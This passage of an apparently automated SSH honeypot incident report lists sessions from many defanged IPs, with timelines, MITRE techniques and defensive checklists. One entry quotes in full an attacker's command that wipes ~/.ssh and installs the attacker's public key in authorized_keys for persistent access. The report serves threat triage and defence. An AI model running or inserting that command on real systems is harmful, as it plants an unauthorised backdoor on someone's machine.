| Field | Detail |
|---|---|
| **Source IP** | `122.175.18[.]235` |
| **First Seen** | 2026-07-23 19:16 |
| **Last Seen** | 2026-07-23 19:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:16:12` | `cowrie.session.connect` |
| `2026-07-23 19:16:12` | `cowrie.client.version` |
| `2026-07-23 19:16:12` | `cowrie.client.kex` |
| `2026-07-23 19:16:13` | `cowrie.login.success` |
| `2026-07-23 19:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.175.18[.]235` to AbuseIPDB if not already reported
- [ ] Block `122.175.18[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58fb615b4658

| Field | Detail |
|---|---|
| **Source IP** | `24.104.225[.]201` |
| **First Seen** | 2026-07-23 19:16 |
| **Last Seen** | 2026-07-23 19:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:16:37` | `cowrie.session.connect` |
| `2026-07-23 19:16:38` | `cowrie.client.version` |
| `2026-07-23 19:16:38` | `cowrie.client.kex` |
| `2026-07-23 19:16:39` | `cowrie.login.success` |
| `2026-07-23 19:16:39` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.104.225[.]201` to AbuseIPDB if not already reported
- [ ] Block `24.104.225[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daae707c27e7

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-07-23 19:16 |
| **Last Seen** | 2026-07-23 19:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:16:37` | `cowrie.session.connect` |
| `2026-07-23 19:16:38` | `cowrie.client.version` |
| `2026-07-23 19:16:38` | `cowrie.client.kex` |
| `2026-07-23 19:16:40` | `cowrie.login.success` |
| `2026-07-23 19:16:41` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a26b72c7fbf

| Field | Detail |
|---|---|
| **Source IP** | `220.163.252[.]244` |
| **First Seen** | 2026-07-23 19:16 |
| **Last Seen** | 2026-07-23 19:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:16:45` | `cowrie.session.connect` |
| `2026-07-23 19:16:46` | `cowrie.client.version` |
| `2026-07-23 19:16:46` | `cowrie.client.kex` |
| `2026-07-23 19:16:48` | `cowrie.login.success` |
| `2026-07-23 19:16:49` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:16:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.163.252[.]244` to AbuseIPDB if not already reported
- [ ] Block `220.163.252[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58e484f2842d

| Field | Detail |
|---|---|
| **Source IP** | `181.47.9[.]103` |
| **First Seen** | 2026-07-23 19:19 |
| **Last Seen** | 2026-07-23 19:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:19:58` | `cowrie.session.connect` |
| `2026-07-23 19:19:58` | `cowrie.client.version` |
| `2026-07-23 19:19:58` | `cowrie.client.kex` |
| `2026-07-23 19:19:59` | `cowrie.login.success` |
| `2026-07-23 19:19:59` | `cowrie.session.params` |
| `2026-07-23 19:19:59` | `cowrie.command.input` |
| `2026-07-23 19:19:59` | `cowrie.command.failed` |
| `2026-07-23 19:20:00` | `cowrie.log.closed` |
| `2026-07-23 19:20:00` | `cowrie.session.params` |
| `2026-07-23 19:20:00` | `cowrie.command.input` |
| `2026-07-23 19:20:01` | `cowrie.session.file_download` |
| `2026-07-23 19:20:01` | `cowrie.log.closed` |
| `2026-07-23 19:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.47.9[.]103` to AbuseIPDB if not already reported
- [ ] Block `181.47.9[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6080fbf15f29

| Field | Detail |
|---|---|
| **Source IP** | `181.47.9[.]103` |
| **First Seen** | 2026-07-23 19:20 |
| **Last Seen** | 2026-07-23 19:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:20:01` | `cowrie.session.connect` |
| `2026-07-23 19:20:01` | `cowrie.client.version` |
| `2026-07-23 19:20:01` | `cowrie.client.kex` |
| `2026-07-23 19:20:02` | `cowrie.login.success` |
| `2026-07-23 19:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.47.9[.]103` to AbuseIPDB if not already reported
- [ ] Block `181.47.9[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-207528196afa

| Field | Detail |
|---|---|
| **Source IP** | `181.47.9[.]103` |
| **First Seen** | 2026-07-23 19:20 |
| **Last Seen** | 2026-07-23 19:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:20:02` | `cowrie.session.connect` |
| `2026-07-23 19:20:02` | `cowrie.client.version` |
| `2026-07-23 19:20:02` | `cowrie.client.kex` |
| `2026-07-23 19:20:03` | `cowrie.login.success` |
| `2026-07-23 19:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.47.9[.]103` to AbuseIPDB if not already reported
- [ ] Block `181.47.9[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8bdbd1d7c1f

| Field | Detail |
|---|---|
| **Source IP** | `103.251.143[.]14` |
| **First Seen** | 2026-07-23 19:21 |
| **Last Seen** | 2026-07-23 19:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:21:04` | `cowrie.session.connect` |
| `2026-07-23 19:21:04` | `cowrie.client.version` |
| `2026-07-23 19:21:04` | `cowrie.client.kex` |
| `2026-07-23 19:21:06` | `cowrie.login.success` |
| `2026-07-23 19:21:07` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.251.143[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.251.143[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fd865618fc5

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-23 19:22 |
| **Last Seen** | 2026-07-23 19:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:22:29` | `cowrie.session.connect` |
| `2026-07-23 19:22:29` | `cowrie.client.version` |
| `2026-07-23 19:22:29` | `cowrie.client.kex` |
| `2026-07-23 19:22:30` | `cowrie.login.success` |
| `2026-07-23 19:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d50ed98e827e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-23 19:22 |
| **Last Seen** | 2026-07-23 19:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:22:29` | `cowrie.session.connect` |
| `2026-07-23 19:22:29` | `cowrie.client.version` |
| `2026-07-23 19:22:29` | `cowrie.client.kex` |
| `2026-07-23 19:22:30` | `cowrie.login.success` |
| `2026-07-23 19:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a5572ed0316

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-23 19:22 |
| **Last Seen** | 2026-07-23 19:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:22:39` | `cowrie.session.connect` |
| `2026-07-23 19:22:39` | `cowrie.client.version` |
| `2026-07-23 19:22:39` | `cowrie.client.kex` |
| `2026-07-23 19:22:39` | `cowrie.login.success` |
| `2026-07-23 19:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3efe911cbca1

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-23 19:22 |
| **Last Seen** | 2026-07-23 19:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:22:40` | `cowrie.session.connect` |
| `2026-07-23 19:22:40` | `cowrie.client.version` |
| `2026-07-23 19:22:40` | `cowrie.client.kex` |
| `2026-07-23 19:22:40` | `cowrie.login.success` |
| `2026-07-23 19:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc4a3107d0b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-23 19:22 |
| **Last Seen** | 2026-07-23 19:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:22:51` | `cowrie.session.connect` |
| `2026-07-23 19:22:51` | `cowrie.client.version` |
| `2026-07-23 19:22:51` | `cowrie.client.kex` |
| `2026-07-23 19:22:52` | `cowrie.login.success` |
| `2026-07-23 19:22:52` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:22:52` | `cowrie.direct-tcpip.data` |
| `2026-07-23 19:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-694fb3936378

| Field | Detail |
|---|---|
| **Source IP** | `14.153.235[.]75` |
| **First Seen** | 2026-07-23 19:24 |
| **Last Seen** | 2026-07-23 19:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:24:09` | `cowrie.session.connect` |
| `2026-07-23 19:24:09` | `cowrie.client.version` |
| `2026-07-23 19:24:09` | `cowrie.client.kex` |
| `2026-07-23 19:24:11` | `cowrie.login.success` |
| `2026-07-23 19:24:11` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.153.235[.]75` to AbuseIPDB if not already reported
- [ ] Block `14.153.235[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e729152899

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-07-23 19:24 |
| **Last Seen** | 2026-07-23 19:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:24:17` | `cowrie.session.connect` |
| `2026-07-23 19:24:17` | `cowrie.client.version` |
| `2026-07-23 19:24:17` | `cowrie.client.kex` |
| `2026-07-23 19:24:20` | `cowrie.login.success` |
| `2026-07-23 19:24:20` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf1edc93498a

| Field | Detail |
|---|---|
| **Source IP** | `122.187.230[.]38` |
| **First Seen** | 2026-07-23 19:32 |
| **Last Seen** | 2026-07-23 19:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:32:52` | `cowrie.session.connect` |
| `2026-07-23 19:32:53` | `cowrie.client.version` |
| `2026-07-23 19:32:53` | `cowrie.client.kex` |
| `2026-07-23 19:32:55` | `cowrie.login.success` |
| `2026-07-23 19:32:56` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.230[.]38` to AbuseIPDB if not already reported
- [ ] Block `122.187.230[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2de2e39adadb

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]10` |
| **First Seen** | 2026-07-23 19:33 |
| **Last Seen** | 2026-07-23 19:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:33:01` | `cowrie.session.connect` |
| `2026-07-23 19:33:02` | `cowrie.client.version` |
| `2026-07-23 19:33:02` | `cowrie.client.kex` |
| `2026-07-23 19:33:04` | `cowrie.login.success` |
| `2026-07-23 19:33:05` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]10` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4800823fd257

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-07-23 19:36 |
| **Last Seen** | 2026-07-23 19:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:36:06` | `cowrie.session.connect` |
| `2026-07-23 19:36:07` | `cowrie.client.version` |
| `2026-07-23 19:36:07` | `cowrie.client.kex` |
| `2026-07-23 19:36:10` | `cowrie.login.success` |
| `2026-07-23 19:36:10` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39a3b6cfcd32

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-23 19:37 |
| **Last Seen** | 2026-07-23 19:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:37:14` | `cowrie.session.connect` |
| `2026-07-23 19:37:14` | `cowrie.client.version` |
| `2026-07-23 19:37:14` | `cowrie.client.kex` |
| `2026-07-23 19:37:14` | `cowrie.login.success` |
| `2026-07-23 19:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b2f678b8a78

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-23 19:37 |
| **Last Seen** | 2026-07-23 19:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:37:15` | `cowrie.session.connect` |
| `2026-07-23 19:37:15` | `cowrie.client.version` |
| `2026-07-23 19:37:15` | `cowrie.client.kex` |
| `2026-07-23 19:37:15` | `cowrie.login.success` |
| `2026-07-23 19:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94b119b47b34

| Field | Detail |
|---|---|
| **Source IP** | `31.173.66[.]222` |
| **First Seen** | 2026-07-23 19:37 |
| **Last Seen** | 2026-07-23 19:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:37:37` | `cowrie.session.connect` |
| `2026-07-23 19:37:37` | `cowrie.client.version` |
| `2026-07-23 19:37:37` | `cowrie.client.kex` |
| `2026-07-23 19:37:38` | `cowrie.login.success` |
| `2026-07-23 19:37:39` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.66[.]222` to AbuseIPDB if not already reported
- [ ] Block `31.173.66[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfa27bf896db

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-07-23 19:37 |
| **Last Seen** | 2026-07-23 19:42 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:37:48` | `cowrie.session.connect` |
| `2026-07-23 19:37:49` | `cowrie.client.version` |
| `2026-07-23 19:37:49` | `cowrie.client.kex` |
| `2026-07-23 19:37:50` | `cowrie.login.success` |
| `2026-07-23 19:37:51` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:42:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac2a5b08f79a

| Field | Detail |
|---|---|
| **Source IP** | `59.11.246[.]91` |
| **First Seen** | 2026-07-23 19:40 |
| **Last Seen** | 2026-07-23 19:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:40:59` | `cowrie.session.connect` |
| `2026-07-23 19:41:00` | `cowrie.client.version` |
| `2026-07-23 19:41:00` | `cowrie.client.kex` |
| `2026-07-23 19:41:02` | `cowrie.login.success` |
| `2026-07-23 19:41:02` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:41:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.11.246[.]91` to AbuseIPDB if not already reported
- [ ] Block `59.11.246[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b011a7c81dbd

| Field | Detail |
|---|---|
| **Source IP** | `223.25.108[.]2` |
| **First Seen** | 2026-07-23 19:41 |
| **Last Seen** | 2026-07-23 19:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:41:08` | `cowrie.session.connect` |
| `2026-07-23 19:41:08` | `cowrie.client.version` |
| `2026-07-23 19:41:08` | `cowrie.client.kex` |
| `2026-07-23 19:41:10` | `cowrie.login.success` |
| `2026-07-23 19:41:11` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.25.108[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.25.108[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89ddf9539449

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-07-23 19:45 |
| **Last Seen** | 2026-07-23 19:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:45:22` | `cowrie.session.connect` |
| `2026-07-23 19:45:23` | `cowrie.client.version` |
| `2026-07-23 19:45:23` | `cowrie.client.kex` |
| `2026-07-23 19:45:25` | `cowrie.login.success` |
| `2026-07-23 19:45:26` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5fe05cd08a8

| Field | Detail |
|---|---|
| **Source IP** | `188.219.104[.]210` |
| **First Seen** | 2026-07-23 19:56 |
| **Last Seen** | 2026-07-23 19:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:56:02` | `cowrie.session.connect` |
| `2026-07-23 19:56:03` | `cowrie.client.version` |
| `2026-07-23 19:56:03` | `cowrie.client.kex` |
| `2026-07-23 19:56:04` | `cowrie.login.success` |
| `2026-07-23 19:56:04` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.219.104[.]210` to AbuseIPDB if not already reported
- [ ] Block `188.219.104[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97b78cccfd16

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-07-23 19:56 |
| **Last Seen** | 2026-07-23 19:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
